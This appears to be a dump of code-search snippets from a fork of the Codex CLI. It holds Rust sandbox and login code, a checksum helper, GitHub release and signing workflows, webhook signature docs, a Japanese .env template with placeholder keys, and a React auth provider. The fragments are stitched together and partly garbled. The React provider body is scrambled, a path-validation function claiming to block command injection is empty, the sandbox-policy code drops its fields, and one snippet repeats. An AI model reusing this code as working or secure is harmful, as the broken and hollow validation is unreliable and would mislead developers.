writable_roots\n            .iter()\n            .any(|writable_root| writable_root.is_path_writable(&amp;abs))\n    };\n\n    for (path, change) in action.changes()",

        "contents": "impl ConfigToml {\n    /// Derive the effective sandbox policy from the configuration.\n    fn derive_sandbox_policy(\n        &amp;self,\n        sandbox_mode_override: Option&lt;SandboxMode&gt;,\n        profile_sandbox_mode: Option&lt;SandboxMode&gt;,\n        resolved_cwd: &amp;Path,\n    ) -&gt; SandboxPolicyResolution {\n        let resolved_sandbox_mode = sandbox_mode_override\n            .or(profile_sandbox_mode)\n            .or(self.sandbox_mode)\n            .or_else(|| {\n                // if no sandbox_mode is set, but user has marked directory as trusted or untrusted, use WorkspaceWrite\n                self.get_active_project(resolved_cwd).and_then(|p| {\n                    if p.is_trusted() || p.is_untrusted() {\n                        Some(SandboxMode::WorkspaceWrite)\n                    } else {\n                        None\n                    }\n                })\n            })\n            .unwrap_or_default();\n        let mut sandbox_policy = match resolved_sandbox_mode {\n            SandboxMode::ReadOnly =&gt; SandboxPolicy::new_read_only_policy(),\n            SandboxMode::WorkspaceWrite =&gt; match self.sandbox_workspace_write.as_ref() {\n                Some(SandboxWorkspaceWrite {\n                    writable_roots,\n                    network_access,\n                    exclude_tmpdir_env_var,\n                    exclude_slash_tmp,\n                }) =&gt; SandboxPolicy::new_workspace_write_policy(),\n            },\n            SandboxMode::DangerFullAccess =&gt; SandboxPolicy::DangerFullAccess,\n        };\n        let mut forced_auto_mode_downgraded_on_windows = false;\n        if cfg!(target_os = \"windows\")\n            &amp;&amp;",

        "contents": "// Verify SHA256 checksum\nasync function verifySHA256(filePath, expectedHash) {\n  const hash = crypto.createHash('sha256');\n  const stream = fs.createReadStream(filePath);\n  \n  return new Promise((resolve, reject) =&gt; {\n    stream.on('data', (data) =&gt; hash.update(data));\n    stream.on('end', () =&gt; {\n      const computed = hash.digest('hex');\n      resolve(computed === expectedHash);\n    });\n    stream.on('error', reject);\n  });\n}\n\n// Validate and sanitize path to prevent command injection\nfunction validatePath(filePath) {\n  // Reject paths with null bytes, command separators, or other dangerous characters\n}",

        "contents": "          for f in \"$dest\"/*; do\n            base=\"$(basename \"$f\")\"\n            # Skip files that are already archives (shouldn't happen, but be\n            # safe).\n            if [[ \"$base\" == *.tar.gz || \"$base\" == *.zip || \"$base\" == *.dmg ]]; then\n              continue\n            fi\n\n            # Don't try to compress signature bundles.\n            if [[ \"$base\" == *.sigstore ]]; then\n              continue\n            fi\n\n            # Create per-binary tar.gz\n            tar -C \"$dest\" -czf \"$dest/${base}.tar.gz\" \"$base\"\n\n            # Create zip archive for Windows binaries\n            # Must run from inside the dest dir so 7z won't\n            # embed the directory path inside the zip.\n            if [[ \"${{ matrix.runner }}\" == windows* ]]; then\n              (cd \"$dest\" &amp;&amp; 7z a \"${base}.zip\" \"$base\")\n            fi\n\n            # Also create .zst (existing behaviour) *and* remove the original\n            # uncompressed binary to keep the directory small.\n            zstd_args=(-T0 -19)\n            if [[ \"${keep_originals}\" == false ]]; then\n              zstd_args+=(--rm)\n            fi\n            zstd \"${zstd_args[@]}\" \"$dest/$base\"\n          done\n\n      - uses: actions/upload-artifact@v6\n        with:\n          name: ${{ matrix.target }}\n          # Upload the per-binary .zst files as well as the new .tar.gz\n          # equivalents we generated in the previous step.\n          path: |\n            codex-rs/dist/${{ matrix.target }}/*\n\n  shell-tool-mcp:\n    name: shell-tool-mcp\n    needs: tag-check\n    uses: ./.github/workflows/shell-tool-mcp.yml\n    with:\n      release-tag: ${{ github.ref_name }}\n      publish: true\n    secrets: inherit\n\n  release:\n    needs:\n      - build\n      - shell-tool-mcp",

    {
      "codeBlock": {
        "relativeWorkspacePath": ".\\.github\\workflows\\release-subagent.yml",
        "range": {
          "startPosition": {
            "line": 61
          },
          "endPosition": {
            "line": 98
          }

        "contents": "      - name: Package binary (Unix)\n        if: runner.os != 'Windows'\n        working-directory: codex-rs\n        run: |\n          mkdir -p ../dist\n          cp target/${{ matrix.target }}/release/codex ../dist/codex\n          chmod +x ../dist/codex\n          tar -czf ../dist/${{ matrix.artifact_name }}.tar.gz -C ../dist codex\n          sha256sum ../dist/${{ matrix.artifact_name }}.tar.gz &gt; ../dist/${{ matrix.artifact_name }}.tar.gz.sha256\n\n      - name: Package binary (Windows)\n        if: runner.os == 'Windows'\n        working-directory: codex-rs\n        shell: pwsh\n        run: |\n          New-Item -ItemType Directory -Force -Path ..\\dist\n          Copy-Item target\\${{ matrix.target }}\\release\\codex.exe ..\\dist\\codex.exe\n          Compress-Archive -Path ..\\dist\\codex.exe -DestinationPath ..\\dist\\${{ matrix.artifact_name }}.zip\n          (Get-FileHash ..\\dist\\${{ matrix.artifact_name }}.zip -Algorithm SHA256).Hash | Out-File -FilePath ..\\dist\\${{ matrix.artifact_name }}.zip.sha256\n\n      - name: Upload artifacts\n        uses: actions/upload-artifact@v4\n        with:\n          name: ${{ matrix.artifact_name }}\n          path: |\n            dist/*\n\n  # ========== npm パッケージング ==========\n  npm-package:\n    name: Package for npm\n    runs-on: ubuntu-latest\n    needs: [build-release]\n    timeout-minutes: 20\n\n    steps:\n      - name: Checkout repository\n        uses: actions/checkout@v5",

        "contents": "name: linux-code-sign\ndescription: Sign Linux artifacts with cosign.\ninputs:\n  target:\n    description: Target triple for the artifacts to sign.\n    required: true\n  artifacts-dir:\n    description: Absolute path to the directory containing built binaries to sign.\n    required: true\n\nruns:\n  using: composite\n  steps:\n    - name: Install cosign\n      uses: sigstore/cosign-installer@v3.7.0\n\n    - name: Cosign Linux artifacts\n      shell: bash\n      env:\n        COSIGN_EXPERIMENTAL: \"1\"\n        COSIGN_YES: \"true\"\n        COSIGN_OIDC_CLIENT_ID: \"sigstore\"\n        COSIGN_OIDC_ISSUER: \"https://oauth2.sigstore.dev/auth\"\n      run: |\n        set -euo pipefail\n\n        dest=\"${{ inputs.artifacts-dir }}\"\n        if [[ ! -d \"$dest\" ]]; then\n          echo \"Destination $dest does not exist\"\n          exit 1\n        fi\n\n        for binary in codex codex-responses-api-proxy; do\n          artifact=\"${dest}/${binary}\"\n          if [[ ! -f \"$artifact\" ]]; then\n            echo \"Binary $artifact not found\"\n            exit 1\n          fi\n\n          cosign sign-blob \\\n            --yes \\\n            --bundle \"${artifact}.sigstore\" \\\n            \"$artifact\"\n        done",

\n&gt; **Winner**: Variant A (Score: 95.6)\n&gt; **Artifacts**: Performance comparison table\n\n---\n\n## HTTP Generic\n\n### Setup\n\n1. **Configure Endpoint**:\n\n   &#96;&#96;&#96;json\n   {\n     \"codex.webhooks.enabled\": true\n   }\n   &#96;&#96;&#96;\n\n2. **Set URL &amp; Secret**:\n\n   &#96;&#96;&#96;bash\n   export CODEX_WEBHOOK_URL=\"https://your-server.com/codex/webhook\"\n   export CODEX_WEBHOOK_SECRET=\"your-hmac-secret\"\n   &#96;&#96;&#96;\n\n### Payload Format\n\n&#96;&#96;&#96;json\n{\n  \"Plan_id\": \"bp-2025-11-02T12:00:00Z_add-logging\",\n  \"title\": \"Add Request Logging\",\n  \"state\": \"approved\",\n  \"summary\": \"Plan approved by john.doe\",\n  \"score\": null,\n  \"timestamp\": \"2025-11-02T12:30:00Z\",\n  \"mode\": \"orchestrated\",\n  \"artifacts\": [\n    \"docs/Plans/2025-11-02_add-logging.md\",\n    \"api/middleware.py\"\n  ]\n}\n&#96;&#96;&#96;\n\n### Headers\n\n&#96;&#96;&#96;\nContent-Type: application/json\nX-Codex-Signature: sha256=abc123def456...\nX-Codex-Event: Plan.approved\n&#96;&#96;&#96;\n\n---\n\n## Signature Verification\n\n### Python\n\n&#96;&#96;&#96;python\nimport hmac\nimport hashlib\n\ndef verify_codex_signature(body: str, signature: str, secret: str) -&gt; bool:\n    \"\"\"Verify HMAC-SHA256 signature from Codex webhook\"\"\"\n    expected = hmac.new(\n        secret.encode('utf-8'),\n        body.encode('utf-8'),\n        hashlib.sha256\n    ).hexdigest()\n    \n    expected_sig = f\"sha256={expected}\"\n    return hmac.compare_digest(expected_sig, signature)\n\n# Usage\nif not verify_codex_signature(request.body, request.headers['X-Codex-Signature'], SECRET):\n    return 401  # Unauthorized\n&#96;&#96;&#96;\n\n### Node.js\n\n&#96;&#96;&#96;javascript\nconst crypto = require('crypto');\n\nfunction verifyCodexSignature(body, signature, secret) {\n    const expected = crypto\n        .createHmac('sha256', secret)\n        .update(body)\n        .digest('hex');\n    \n    const expectedSig = &#96;sha256=${expected}&#96;;\n    return crypto.timingSafeEqual(\n        Buffer.from(signature),\n        Buffer.from(expectedSig)\n    );\n}\n&#96;&#96;&#96;\n\n### Rust\n\n&#96;&#96;&#96;rust\nuse hmac::{Hmac, Mac};\nuse sha2::Sha256;",

bool:\n    \"\"\"Verify HMAC-SHA256 signature from Codex webhook\"\"\"\n    expected = hmac.new(\n        secret.encode('utf-8'),\n        body.encode('utf-8'),\n        hashlib.sha256\n    ).hexdigest()\n    \n    expected_sig = f\"sha256={expected}\"\n    return hmac.compare_digest(expected_sig, signature)\n\n# Usage\nif not verify_codex_signature(request.body, request.headers['X-Codex-Signature'], SECRET):\n    return 401  # Unauthorized\n&#96;&#96;&#96;\n\n### Node.js\n\n&#96;&#96;&#96;javascript\nconst crypto = require('crypto');\n\nfunction verifyCodexSignature(body, signature, secret) {\n    const expected = crypto\n        .createHmac('sha256', secret)\n        .update(body)\n        .digest('hex');\n    \n    const expectedSig = &#96;sha256=${expected}&#96;;\n    return crypto.timingSafeEqual(\n        Buffer.from(signature),\n        Buffer.from(expectedSig)\n    );\n}\n&#96;&#96;&#96;\n\n### Rust\n\n&#96;&#96;&#96;rust\nuse hmac::{Hmac, Mac};\nuse sha2::Sha256;",

        "contents": "name: ci\n\non:\n  pull_request: {}\n  push: { branches: [main] }\n\njobs:\n  build-test:\n    runs-on: ubuntu-latest\n    timeout-minutes: 10\n    env:\n      NODE_OPTIONS: --max-old-space-size=4096\n    steps:\n      - name: Checkout repository\n        uses: actions/checkout@v6\n\n      - name: Setup pnpm\n        uses: pnpm/action-setup@v4\n        with:\n          run_install: false\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v6\n        with:\n          node-version: 22\n\n      - name: Install dependencies\n        run: pnpm install --frozen-lockfile\n\n      # stage_npm_packages.py requires DotSlash when staging releases.\n      - uses: facebook/install-dotslash@v2\n\n      - name: Stage npm package\n        id: stage_npm_package\n        env:\n          GH_TOKEN: ${{ github.token }}\n        run: |\n          set -euo pipefail\n          # Use a rust-release version that includes all native binaries.\n          CODEX_VERSION=0.74.0\n          OUTPUT_DIR=\"${RUNNER_TEMP}\"\n          python3 ./scripts/stage_npm_packages.py \\\n            --release-version \"$CODEX_VERSION\" \\\n            --package codex \\\n            --output-dir \"$OUTPUT_DIR\"\n          PACK_OUTPUT=\"${OUTPUT_DIR}/codex-npm-${CODEX_VERSION}.tgz\"\n          echo \"pack_output=$PACK_OUTPUT\" &gt;&gt; \"$GITHUB_OUTPUT\"\n\n      - name: Upload staged npm package artifact\n        uses: actions/upload-artifact@v6\n        with:\n          name: codex-npm-staging\n          path: ${{ steps.stage_npm_package.outputs.pack_output }}\n\n      - name: Ensure root README.md contains only ASCII and certain Unicode code points\n        run: ./scripts/asciicheck.py README.md\n      - name: Check root README ToC\n        run: python3 scripts/readme_toc.py README.md\n\n      - name: Ensure codex-cli/README.md contains only ASCII and certain Unicode code points\n        run: ./scripts/asciicheck.py codex-cli/README.md\n      - name: Check codex-cli/README ToC\n        run: python3 scripts/readme_toc.py codex-cli/README.md\n\n      - name: Prettier (run &#96;pnpm run format:fix&#96; to fix)\n        run: pnpm run format\n\n  mcp-integration-test:\n    runs-on: windows-latest",

        "contents": "struct WriteRequest {\n    request: RpcRequest,\n    response_tx: tokio::sync::oneshot::Sender&lt;RpcResponse&gt;,\n}\n\n/// Task information\n#[derive(Debug, Clone)]\n#[allow(dead_code)]\nstruct TaskInfo {\n    task_id: String,\n    agent_type: String,\n    status: String,\n    submitted_at: SystemTime,\n}\n\n/// Session information\n#[derive(Debug, Clone)]\nstruct SessionInfo {\n    session_id: String,\n    cwd: PathBuf,\n    started_at: SystemTime,\n}\n\n/// Token budget tracker\n#[derive(Debug, Clone)]\nstruct TokenBudget {\n    total_budget: u64,\n    used: u64,\n    warning_threshold: u64,\n    per_agent_usage: HashMap&lt;String, u64&gt;,\n}\n\nimpl OrchestratorServer {\n    /// Validate path to prevent directory traversal attacks\n    /// Ensures the path is within allowed base directories\n    fn validate_path_against_base(\n        path: &amp;Path,\n        base_dirs: &amp;[PathBuf],\n    ) -&gt; Result&lt;PathBuf, String&gt; {\n        // Canonicalize to resolve symlinks and normalize\n        let canonical = path\n            .canonicalize()\n            .map_err(|e| format!(\"Failed to canonicalize path: {e}\"))?;\n\n        // Check if path is within any allowed base directory\n        for base_dir in base_dirs {\n            if let Ok(base_canonical) = base_dir.canonicalize() {\n                if canonical.starts_with(&amp;base_canonical) {\n                    return Ok(canonical);\n                }\n            }\n        }\n\n        Err(format!(\n            \"Path access denied: path must be within allowed base directories. Requested: {:?}, Allowed bases: {:?}\",\n            canonical,\n            base_dirs\n        ))\n    }",

        "contents": "# 選択肢: error, warn, info, debug, trace\n# 用途: デバッグ時に詳細ログを出力\nRUST_LOG=info\n\n# ==================== 開発・デバッグ用（任意） ====================\n\n# デバッグモード（1で有効化）\n# 用途: 詳細なデバッグ情報を出力\n# DEBUG=\n\n# ログの詳細レベル\n# 用途: より詳細なログを出力\n# VERBOSE=\n\n# ==================== 使用例 ====================\n\n# 【パターン1】最小構成（OpenAIのみ）:\n# CODEX_API_KEY=sk-proj-XXXXXXXXXXXXXXXXXXXX\n\n# 【パターン2】標準構成（GitHub連携込み）:\n# CODEX_API_KEY=sk-proj-XXXXXXXXXXXXXXXXXXXX\n# GITHUB_TOKEN=ghp_XXXXXXXXXXXXXXXXXXXX\n\n# 【パターン3】フル機能構成（すべてのMCPサーバー有効化）:\n# CODEX_API_KEY=sk-proj-XXXXXXXXXXXXXXXXXXXX\n# OPENAI_API_KEY=sk-proj-XXXXXXXXXXXXXXXXXXXX\n# GITHUB_TOKEN=ghp_XXXXXXXXXXXXXXXXXXXX\n# GEMINI_API_KEY=AIzaSyXXXXXXXXXXXXXXXXXXXXXXXXXXX\n# BRAVE_API_KEY=BSA_XXXXXXXXXXXXXXXXXXXX\n# SLACK_WEBHOOK_URL=https://hooks.slack.com/services/XXX/XXX/XXX\n# RUST_LOG=info\n\n# ==================== 読み込み方法 ====================\n\n# 【方法1】PowerShell（Windows）\n# 現在のセッションに読み込み:\nGet-Content .env | ForEach-Object {\n    if ($_ -match '^([^#][^=]+)=(.*)$') {\n        [System.Environment]::SetEnvironmentVariable($matches[1].Trim(), $matches[2].Trim(), \"Process\")\n    }\n}\n\n# 【方法2】Bash/Zsh（Linux/macOS）\n# 現在のシェルに読み込み:\nset -a\nsource .env\nset +a\n\n# 【方法3】専用スクリプト使用（推奨）\n# PowerShell: .\\zapabob\\scripts\\load-env.ps1\n# Bash: source zapabob/scripts/load-env.sh\n\n# 【方法4】自動読み込みツール\n# - direnv: https://direnv.net/\n#   .envrc ファイルに「dotenv」と記述するだけで自動読み込み\n# - dotenv (Node.js): https://www.npmjs.com/package/dotenv\n#   require('dotenv').config() で読み込み\n\n# ==================== セキュリティチェックリスト ====================\n\n# ✅ .envファイルを.gitignoreに追加済み（51行目: .env*）\n# ✅ パーミッション設定: chmod 600 .env（Linux/macOS）",

        "contents": "export function CodexProvider({ children }: { children: ReactNode }) {\n() =&gt; {\nconst initialize = async \n\n    };\n\n    initialize();\n  }, []);\n\n  const login = async (email: string, password: string) =&gt; {\n    try {\n      dispatch({ type: 'SET_LOADING', payload: true });\n      dispatch({ type: 'SET_ERROR', payload: null });\n\n      // For now, use API key login\n      await apiClient.login({\n        method: 'api-key',\n        apiKey: password, // password field contains API key\n      });\n\n      // Load user data\n      const account = await apiClient.getAccount();\n      dispatch({\n        type: 'SET_USER',\n        payload: {\n          id: account.id || 'user',\n          email: account.email,\n          name: account.name,\n          plan: account.plan || 'free',\n        },\n      });\n\n    } catch (error) {\n      dispatch({\n        type: 'SET_ERROR',\n        payload: error instanceof Error ? error.message : 'ログインに失敗しました',\n      });\n      throw error;\n    } finally {\n      dispatch({ type: 'SET_LOADING', payload: false });\n    }\n  };\n\n  const logout = async () =&gt; {\n    try {\n      await apiClient.logout();\n      dispatch({ type: 'SET_USER', payload: null });\n      dispatch({ type: 'SET_CONVERSATIONS', payload: [] });\n      dispatch({ type: 'SET_CURRENT_CONVERSATION', payload: null });\n      dispatch({ type: 'SET_MESSAGES', payload: [] });\n    } catch (error) {\n      console.error('Logout error:', error);\n    }\n  };\n\n  const createConversation = async (model: string, initialMessage: string) =&gt;\n;\n}",

        "contents": "        }\n    }\n\n    async fn login_api_key_common(\n        &amp;mut self,\n        params: &amp;LoginApiKeyParams,\n    ) -&gt; std::result::Result&lt;(), JSONRPCErrorError&gt; {\n        if matches!(\n            self.config.forced_login_method,\n            Some(ForcedLoginMethod::Chatgpt)\n        ) {\n            return Err(JSONRPCErrorError {\n                code: INVALID_REQUEST_ERROR_CODE,\n                message: \"API key login is disabled. Use ChatGPT login instead.\".to_string(),\n                data: None,\n            });\n        }\n\n        // Cancel any active login attempt.\n        {\n            let mut guard = self.active_login.lock().await;\n            if let Some(active) = guard.take() {\n                drop(active);\n            }\n        }\n\n        match login_with_api_key(\n            &amp;self.config.codex_home,\n            &amp;params.api_key,\n            self.config.cli_auth_credentials_store_mode,\n        ) {\n            Ok(()) =&gt; {\n                self.auth_manager.reload();\n                Ok(())\n            }\n            Err(err) =&gt; Err(JSONRPCErrorError {\n                code: INTERNAL_ERROR_CODE,\n                message: format!(\"failed to save api key: {err}\"),\n                data: None,\n            }),\n        }\n    }\n\n    async fn login_api_key_v1(&amp;mut self, request_id: RequestId, params: LoginApiKeyParams) {\n        match self.login_api_key_common(&amp;params).await {\n            Ok(()) =&gt; {\n                self.outgoing\n                    .send_response(request_id, LoginApiKeyResponse {})\n                    .await;\n\n                let payload = AuthStatusChangeNotification {\n                    auth_method: self.auth_manager.auth().map(|auth| auth.mode),\n                };\n                self.outgoing\n                    .send_server_notification(ServerNotification::AuthStatusChange(payload))\n                    .await;\n            }\n            Err(error) =&gt; {\n                self.outgoing.send_error(request_id, error).await;\n            }\n        }\n    }\n\n    async fn login_api_key_v2",
